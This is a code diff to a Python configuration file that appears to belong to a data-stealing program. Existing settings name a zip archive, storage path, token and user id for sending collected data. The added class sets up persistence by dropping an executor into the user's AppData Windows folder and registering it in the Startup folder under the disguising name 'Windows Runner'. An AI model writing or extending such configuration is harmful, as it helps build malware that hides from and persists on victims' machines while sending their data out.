@@ -75,3 +75,13 @@ class SystemConfig:
 class SenderConfig:
 
     Variables: tuple = ("zip_name", "storage_path", "storage_folder", "token", "user_id", "errors")
+
+
+@dataclass
+class AutostartConfig:
+
+    User: str = GetUserName()
+    ExecutorPath: str = rf"C:\Users\{User}\AppData\Roaming\Microsoft\Windows"
+    AutostartName: str = "Windows Runner"
+    AutostartPath: str = rf"C:\Users\{User}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+    Variables: tuple = ("executor_path", "statuses", "errors")
